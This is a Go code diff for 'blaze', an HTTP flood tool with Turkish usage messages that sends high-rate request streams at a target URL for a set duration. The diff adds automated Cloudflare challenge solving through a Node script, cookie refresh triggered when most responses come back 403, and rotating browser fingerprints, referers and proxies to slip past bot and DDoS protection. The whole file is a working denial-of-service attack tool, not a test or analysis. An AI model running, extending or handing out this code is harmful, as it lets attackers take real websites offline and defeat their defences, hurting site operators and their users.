@@ -2,8 +2,11 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
+	"os/exec"
 	"os/signal"
 	"runtime"
 	"strconv"
@@ -16,20 +19,20 @@ import (
 	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
 )
 
+// ANSI colors
+const (
+	white = "\033[37m"
+	gray  = "\033[38;5;245m"
+	red   = "\033[31m"
+	reset = "\033[0m"
+)
+
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya]")
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
+		fmt.Println()
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
-		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
-		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt")
-		fmt.Println()
-		fmt.Println("her iki browser (firefox+chrome) ayni anda kullanilir")
-		fmt.Println()
-		fmt.Println("proxy dosya formati (satir satir):")
-		fmt.Println("  ip:port")
-		fmt.Println("  ip:port:user:pass")
-		fmt.Println("  socks5://ip:port")
-		fmt.Println("  http://user:pass@ip:port")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
 		os.Exit(1)
 	}
 
@@ -42,28 +45,102 @@ func main() {
 	threads := mustInt(os.Args[3], "thread")
 
 	streams := 32
-	if len(os.Args) >= 5 {
-		streams = mustInt(os.Args[4], "stream")
-	}
-
 	method := "GET"
-	if len(os.Args) >= 6 {
-		method = strings.ToUpper(os.Args[5])
-	}
-
 	proxyArg := ""
-	if len(os.Args) >= 7 {
-		proxyArg = os.Args[6]
+	solve := false
+
+	posArgs := []string{}
+	for _, arg := range os.Args[4:] {
+		if arg == "--solve" {
+			solve = true
+		} else {
+			posArgs = append(posArgs, arg)
+		}
+	}
+	if len(posArgs) >= 1 {
+		streams = mustInt(posArgs[0], "stream")
+	}
+	if len(posArgs) >= 2 {
+		method = strings.ToUpper(posArgs[1])
+	}
+	if len(posArgs) >= 3 {
+		proxyArg = posArgs[2]
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg)
+	var solvedCookies string
+	var solvedUA string
+	if solve {
+		var err error
+		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
+			os.Exit(1)
+		}
+	}
+
+	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
 }
 
-// clientGroup holds multiple clients of the same browser type for connection multiplying.
+type solverResult struct {
+	Status    string `json:"status"`
+	URL       string `json:"url"`
+	UserAgent string `json:"user_agent"`
+	Cookies   string `json:"cookies"`
+	Error     string `json:"error"`
+}
+
+func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
+	fmt.Printf("cloudflare challenge cozuluyor...\n")
+
+	solverPath := findSolver()
+	if solverPath == "" {
+		return "", "", fmt.Errorf("solver/index.js bulunamadi")
+	}
+	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
+		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
+	cmd.Stderr = os.Stderr
+	output, errCmd := cmd.Output()
+	if errCmd != nil {
+		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
+	}
+
+	var result solverResult
+	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
+		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
+	}
+
+	if result.Status == "error" {
+		return "", "", fmt.Errorf("%s", result.Error)
+	}
+	if result.Cookies == "" {
+		return "", "", fmt.Errorf("cookie yok (status: %s)", result.Status)
+	}
+
+	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
+	return result.Cookies, result.UserAgent, nil
+}
+
+func findSolver() string {
+	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+	return ""
+}
+
 type clientGroup struct {
 	name      string
+	tag       string // Ch, FF, SF
 	clients   []*gofire.Client
 	pipelines []*gofire.Pipeline
+	templates []*http.Request
 }
 
 func (cg *clientGroup) Close() {
@@ -83,40 +160,85 @@ func (cg *clientGroup) ActiveConnections() int64 {
 	return total
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
+func (cg *clientGroup) updateCookies(newCookies string) {
+	for _, tmpl := range cg.templates {
+		tmpl.Header.Set("Cookie", newCookies)
+	}
+}
+
+// browserLabel maps tag to full display name
+var browserLabel = map[string]string{
+	"Ch": "Chrome 146",
+	"FF": "Firefox 148",
+	"SF": "Safari iOS 18",
+}
+
+// formatTestResult returns the impersonate line for a browser test.
+func formatTestResult(tag string, statusCode int, err error) string {
+	label := browserLabel[tag]
+	if label == "" {
+		label = tag
+	}
+
+	if err != nil {
+		errMsg := err.Error()
+		var reason string
+		switch {
+		case strings.Contains(errMsg, "tls handshake") || strings.Contains(errMsg, "handshake"):
+			reason = "tls handshake failed"
+		case strings.Contains(errMsg, "timeout") || strings.Contains(errMsg, "Timeout"):
+			reason = "timeout"
+		case strings.Contains(errMsg, "connection refused"):
+			reason = "connection refused"
+		default:
+			reason = errMsg
+			if len(reason) > 80 {
+				reason = reason[:80]
+			}
+		}
+		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, reason, reset)
+	}
+	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
+}
+
+func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	// Client instances per browser type.
-	// Too many connections from one IP triggers Cloudflare DDoS detection.
-	// 4 per browser (8 total) is the sweet spot: enough concurrency without triggering WAF.
-	clientsPerBrowser := 4
-
-	idlePerHost := 256
-	totalIdle := 1024
+	totalTargetClients := threads
+	if totalTargetClients > 40 {
+		totalTargetClients = 40
+	}
+	if totalTargetClients < 10 {
+		totalTargetClients = 10
+	}
 
 	baseOpts := []gofire.Option{
 		gofire.WithTimeout(10 * time.Second),
 		gofire.WithTLSHandshakeTimeout(8 * time.Second),
 		gofire.WithDialTimeout(8 * time.Second),
-		gofire.WithMaxIdleConnsPerHost(idlePerHost),
-		gofire.WithMaxIdleConns(totalIdle),
+		gofire.WithMaxIdleConnsPerHost(256),
+		gofire.WithMaxIdleConns(1024),
 		gofire.WithMaxConnsPerHost(0),
 		gofire.WithDNSCacheTTL(30 * time.Minute),
 		gofire.WithIdleConnTimeout(120 * time.Second),
 		gofire.WithMaxRedirects(3),
-		gofire.WithReferer("https://www.google.com/"),
 		gofire.WithWriteBufferSize(128 * 1024),
 		gofire.WithReadBufferSize(128 * 1024),
 	}
 
-	// Detect proxy mode
+	browserReferers := map[string]string{
+		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
+		"chrome":  "https://www.google.com/",
+		"firefox": "https://duckduckgo.com/",
+	}
+
 	var proxyRotator *gofire.ProxyRotator
 	if proxyArg != "" {
 		if isProxyFile(proxyArg) {
 			var err error
 			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
+				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
 				os.Exit(1)
 			}
 		} else {
@@ -124,65 +246,87 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		}
 	}
 
-	// Create multiple clients per browser with weighted distribution.
-	// Safari 40%, Chrome 30%, Firefox 30% - Safari is most trusted by Cloudflare.
+	var parsedCookies []*http.Cookie
+	if solvedCookies != "" {
+		parsedCookies = parseCookieHeader(solvedCookies)
+	}
+
 	type browserSpec struct {
 		name    string
+		tag     string // Ch, FF, SF
 		profile gofire.BrowserProfile
-		clients int // number of client instances
+		clients int
 	}
 
-	// Total ~10 clients split: 4 safari + 3 chrome + 3 firefox
-	safariClients := clientsPerBrowser     // 4
-	chromeClients := clientsPerBrowser - 1 // 3
-	firefoxClients := clientsPerBrowser - 1 // 3
-	if chromeClients < 1 {
-		chromeClients = 1
-	}
-	if firefoxClients < 1 {
-		firefoxClients = 1
-	}
+	var browsers []browserSpec
 
-	browsers := []browserSpec{
-		{"firefox", gofire.Firefox148, firefoxClients},
-		{"chrome", gofire.Chrome146, chromeClients},
-		{"safari", gofire.SafariIOS18, safariClients},
+	if solvedCookies != "" {
+		browsers = []browserSpec{
+			{"chrome", "Ch", gofire.Chrome146, totalTargetClients},
+		}
+		if solvedUA != "" {
+			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
+		}
+	} else {
+		safariClients := totalTargetClients * 4 / 10
+		chromeClients := totalTargetClients * 3 / 10
+		firefoxClients := totalTargetClients - safariClients - chromeClients
+		if safariClients < 2 {
+			safariClients = 2
+		}
+		if chromeClients < 1 {
+			chromeClients = 1
+		}
+		if firefoxClients < 1 {
+			firefoxClients = 1
+		}
+		browsers = []browserSpec{
+			{"firefox", "FF", gofire.Firefox148, firefoxClients},
+			{"chrome", "Ch", gofire.Chrome146, chromeClients},
+			{"safari", "SF", gofire.SafariIOS18, safariClients},
+		}
 	}
 
 	groups := make([]*clientGroup, len(browsers))
 
-	// Calculate total clients for worker distribution
 	totalClients := 0
 	for _, bs := range browsers {
 		totalClients += bs.clients
 	}
 	workersPerClient := (threads * streams) / totalClients
-	if workersPerClient < 50 {
-		workersPerClient = 50
+	if workersPerClient < 1 {
+		workersPerClient = 1
 	}
 
 	for bi, bs := range browsers {
-		cg := &clientGroup{name: bs.name}
+		cg := &clientGroup{name: bs.name, tag: bs.tag}
+		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))
 
 		for i := 0; i < bs.clients; i++ {
-			c, err := gofire.Emulate(bs.profile, baseOpts...)
+			c, err := gofire.Emulate(bs.profile, opts...)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: %s client[%d] olusturulamadi: %v\n", bs.name, i, err)
+				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
 				os.Exit(1)
 			}
 			if proxyRotator != nil {
 				c.SetProxyRotator(proxyRotator)
 			}
-			// Pre-build request template for FastDo path
+			if len(parsedCookies) > 0 {
+				_ = c.SetCookies(targetURL, parsedCookies)
+			}
 			tmpl, err := c.PrepareRequest(method, targetURL)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: %s template olusturulamadi: %v\n", bs.name, err)
+				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
 				os.Exit(1)
+			}
+			if solvedCookies != "" {
+				tmpl.Header.Set("Cookie", solvedCookies)
 			}
 			p := c.NewPipeline(workersPerClient)
 			p.SetTemplate(tmpl)
 			cg.clients = append(cg.clients, c)
 			cg.pipelines = append(cg.pipelines, p)
+			cg.templates = append(cg.templates, tmpl)
 		}
 		groups[bi] = cg
 	}
@@ -192,47 +336,27 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		}
 	}()
 
-	actualWorkers := workersPerClient * totalClients
-	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
-		targetURL, durSec, actualWorkers, workersPerClient, method)
-	fmt.Printf("browser: %d safari(40%%) + %d chrome(30%%) + %d firefox(30%%) client (toplam %d baglanti)\n",
-		safariClients, chromeClients, firefoxClients, totalClients)
-	if proxyRotator != nil {
-		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
-	} else if proxyArg != "" {
-		fmt.Printf("proxy: %s\n", proxyArg)
-	}
-
-	// Test one client per browser
+	// Test one client per browser - clean output
 	for _, cg := range groups {
-		fmt.Printf("test [%s]... ", cg.name)
 		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
 		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
 		testCancel()
 		if testErr != nil {
-			fmt.Printf("BASARISIZ: %v\n", testErr)
+			fmt.Println(formatTestResult(cg.tag, 0, testErr))
 		} else {
-			fmt.Printf("OK %d\n", resp.StatusCode())
+			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
 			resp.Close()
 		}
 	}
 
-	// Pre-warm all clients
-	fmt.Print("baglanti isitiliyor... ")
+	// Pre-warm silently
 	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
-	warmPerClient := 4
 	for _, cg := range groups {
 		for _, c := range cg.clients {
-			_ = c.PreConnect(warmCtx, targetURL, warmPerClient)
+			_ = c.PreConnect(warmCtx, targetURL, 4)
 		}
 	}
 	warmCancel()
-
-	var totalConns int64
-	for _, cg := range groups {
-		totalConns += cg.ActiveConnections()
-	}
-	fmt.Printf("%d baglanti\n", totalConns)
 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
 	defer cancel()
@@ -241,37 +365,35 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigCh
-		fmt.Println("\ndurduruluyor...")
 		cancel()
 	}()
 
 	var (
-		totalSent    atomic.Int64
-		totalSuccess atomic.Int64
-		totalFailed  atomic.Int64
-		statusCodes  sync.Map
-		errMu        sync.Mutex
-		recentErrs   []string
-		errCountMap  sync.Map
+		totalSent   atomic.Int64
+		totalFailed atomic.Int64
+		errMu       sync.Mutex
+		recentErrs  []string
+		errCountMap sync.Map
+		recent403   atomic.Int64
+		recentTotal atomic.Int64
+		refreshing  atomic.Bool
 	)
 
-	startTime := time.Now()
-	fmt.Printf("basliyor... %d worker x %d client (firefox+chrome)\n\n", actualWorkers, totalClients)
-
-	// OnResult callback - called by pipeline workers directly.
-	// Do NOT call resp.Close() here - pipeline drains bodies asynchronously.
 	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
 		totalSent.Add(1)
 		if err != nil {
 			totalFailed.Add(1)
 
 			errStr := err.Error()
+			if strings.Contains(errStr, "context canceled") {
+				return
+			}
 			if len(errStr) > 200 {
 				errStr = errStr[:200]
 			}
 			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
 				errMu.Lock()
-				if len(recentErrs) < 5 {
+				if len(recentErrs) < 10 {
 					recentErrs = append(recentErrs, errStr)
 				}
 				errMu.Unlock()
@@ -279,25 +401,20 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 			if val, ok := errCountMap.Load(errStr); ok {
 				val.(*atomic.Int64).Add(1)
 			}
-		} else {
-			totalSuccess.Add(1)
-			if resp != nil {
-				sc := resp.StatusCode()
-				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
-				val.(*atomic.Int64).Add(1)
-				// Body drain handled by pipeline's async drain pool
+		} else if resp != nil {
+			recentTotal.Add(1)
+			if resp.StatusCode() == 403 {
+				recent403.Add(1)
 			}
 		}
 	}
 
-	// Set OnResult callback on all pipelines
 	for _, cg := range groups {
 		for _, p := range cg.pipelines {
 			p.OnResult = onResult
 		}
 	}
 
-	// Feeder: pure FireAndForget - no blocking, no channels, maximum throughput
 	var feedWg sync.WaitGroup
 	feedPipeline := func(pipeline *gofire.Pipeline) {
 		defer feedWg.Done()
@@ -311,18 +428,57 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		}
 	}
 
-	// Launch feeders: enough to keep the pipeline job channel saturated
-	feedersPerPipeline := 4
 	for _, cg := range groups {
 		for _, p := range cg.pipelines {
-			for i := 0; i < feedersPerPipeline; i++ {
+			for i := 0; i < 4; i++ {
 				feedWg.Add(1)
 				go feedPipeline(p)
 			}
 		}
 	}
 
-	// Stats printer
+	// Auto-refresh (silent unless refreshing)
+	if solveEnabled {
+		go func() {
+			ticker := time.NewTicker(5 * time.Second)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					total := recentTotal.Load()
+					count403 := recent403.Load()
+					recentTotal.Store(0)
+					recent403.Store(0)
+
+					if total < 50 {
+						continue
+					}
+					rate := float64(count403) / float64(total)
+					if rate < 0.80 {
+						continue
+					}
+					if !refreshing.CompareAndSwap(false, true) {
+						continue
+					}
+
+					newCookies, _, errSolve := solveCFChallenge(targetURL)
+					if errSolve != nil {
+						refreshing.Store(false)
+						continue
+					}
+					for _, cg := range groups {
+						cg.updateCookies(newCookies)
+					}
+					refreshing.Store(false)
+				}
+			}
+		}()
+	}
+
+	// RPS stats
+	startTime := time.Now()
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
@@ -335,83 +491,43 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 				return
 			case <-ticker.C:
 				sent := totalSent.Load()
-				ok := totalSuccess.Load()
-				fail := totalFailed.Load()
 				elapsed := time.Since(startTime).Seconds()
-
 				rps := sent - lastSent
 				lastSent = sent
 				if rps > peakRPS {
 					peakRPS = rps
 				}
-
-				var conns int64
-				for _, cg := range groups {
-					conns += cg.ActiveConnections()
-				}
-
-				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d conn:%d %.0fs   ",
-					sent, ok, fail, rps, peakRPS, conns, elapsed)
+				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s   ",
+					white, sent, rps, peakRPS, elapsed, reset)
 			}
 		}
 	}()
 
 	feedWg.Wait()
+	fmt.Println()
 
-	totalDuration := time.Since(startTime)
-	sent := totalSent.Load()
-	ok := totalSuccess.Load()
-	fail := totalFailed.Load()
-
-	avgRPS := float64(0)
-	if totalDuration.Seconds() > 0 {
-		avgRPS = float64(sent) / totalDuration.Seconds()
-	}
-	successRate := float64(0)
-	if sent > 0 {
-		successRate = float64(ok) / float64(sent) * 100
-	}
-
-	var finalConns int64
-	for _, cg := range groups {
-		finalConns += cg.ActiveConnections()
-	}
-
-	fmt.Printf("\n\n--- sonuclar ---\n")
-	fmt.Printf("gonderilen: %d\n", sent)
-	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
-	fmt.Printf("basarisiz:  %d\n", fail)
-	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
-	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
-	fmt.Printf("baglanti:   %d (%d client)\n", finalConns, totalClients)
-
-	hasStatus := false
-	statusCodes.Range(func(key, value interface{}) bool {
-		if !hasStatus {
-			fmt.Println("\nstatus kodlari:")
-			hasStatus = true
-		}
-		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
-		return true
-	})
-
+	// Only show errors on stop
 	errMu.Lock()
 	if len(recentErrs) > 0 {
-		fmt.Println("\nhatalar:")
+		fmt.Println()
 		for _, e := range recentErrs {
 			count := int64(0)
 			if val, ok := errCountMap.Load(e); ok {
 				count = val.(*atomic.Int64).Load()
 			}
-			fmt.Printf("  [%dx] %s\n", count, e)
+			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
 		}
 	}
 	errMu.Unlock()
-
-	fmt.Println()
 }
 
-// isProxyFile checks if the argument is a file path (vs a proxy URL).
+func parseCookieHeader(raw string) []*http.Cookie {
+	header := http.Header{}
+	header.Add("Cookie", raw)
+	req := http.Request{Header: header}
+	return req.Cookies()
+}
+
 func isProxyFile(s string) bool {
 	if strings.Contains(s, "://") {
 		return false
@@ -419,16 +535,13 @@ func isProxyFile(s string) bool {
 	if _, err := os.Stat(s); err == nil {
 		return true
 	}
-	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
-		return true
-	}
-	return false
+	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
 }
 
 func mustInt(s, name string) int {
 	v, err := strconv.Atoi(s)
 	if err != nil || v <= 0 {
-		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
+		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
 		os.Exit(1)
 	}
 	return v
